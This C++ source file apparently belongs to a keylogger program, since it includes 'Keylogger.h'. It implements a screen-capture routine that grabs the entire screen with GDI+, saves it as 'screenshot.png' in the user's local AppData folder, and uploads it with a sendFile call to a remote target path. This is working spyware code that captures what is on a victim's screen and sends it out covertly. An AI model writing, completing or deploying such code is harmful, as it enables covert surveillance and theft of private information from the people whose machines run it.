#include "Keylogger.h"

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT  num = 0;        
    UINT  size = 0;         

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1; 

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  
        }
    }

    free(pImageCodecInfo);
    return -1; 
}

void takeScreenShot(std::string dest)
{
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	HDC hdcScreen = GetDC(NULL);
	HDC hdcCapture = CreateCompatibleDC(hdcScreen);
	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
	SelectObject(hdcCapture, hCaptureBitmap);
    if (!BitBlt(hdcCapture, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY))
    {
        DeleteObject(hCaptureBitmap);
        return;
    }

	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcCapture);

	CLSID pngClsid;
	GetEncoderClsid(L"image/png", &pngClsid);
	Gdiplus::Bitmap captureBitmap(hCaptureBitmap, NULL);
    wchar_t buffer[4098];
    
    size_t  n = 0;
    mbstowcs_s(&n, buffer, 4098, dest.c_str(), dest.length());
	captureBitmap.Save(buffer, & pngClsid, NULL);
	DeleteObject(hCaptureBitmap);
}	

void uploadScreenShot(std::string targetPath)
{
    std::string dest = winkey_g.localAppData + "\\screenshot.png";
    takeScreenShot(dest);
    sendFile(dest.c_str(), std::string(targetPath + "/ScreenShot.png").c_str());
}